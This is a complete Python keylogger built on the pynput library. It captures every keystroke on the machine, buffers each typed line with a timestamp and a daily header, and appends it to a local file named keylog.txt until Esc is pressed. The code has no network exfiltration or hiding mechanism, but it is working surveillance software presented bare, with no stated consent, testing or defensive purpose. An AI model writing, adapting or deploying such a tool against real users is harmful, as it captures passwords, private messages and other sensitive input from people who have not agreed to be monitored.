from pynput import keyboard
from datetime import datetime, date

log_file_path = "keylog.txt"
buffer = ""
last_logged_date = None

# Write a new log header if it's a new day
def write_header_if_new_day():
    global last_logged_date
    current_date = date.today()
    if last_logged_date != current_date:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"\n=== Log Date: {current_date} ===\n")
        last_logged_date = current_date

# Write the buffered line with timestamp
def write_buffered_line():
    global buffer
    if buffer.strip() != "":
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file_path, "a") as log_file:
            log_file.write(f"[{timestamp}] {buffer}\n")
        buffer = ""  # Reset buffer

def on_press(key):
    global buffer

    write_header_if_new_day()

    try:
        # Normal key (letters, numbers, symbols)
        buffer += key.char
    except AttributeError:
        # Special keys
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            write_buffered_line()
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]  # Remove last char
        elif key == keyboard.Key.esc:
            print("Exiting keylogger...")
            write_buffered_line()  # Save any remaining data
            return False
        else:
            buffer += f"[{key.name}]"

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()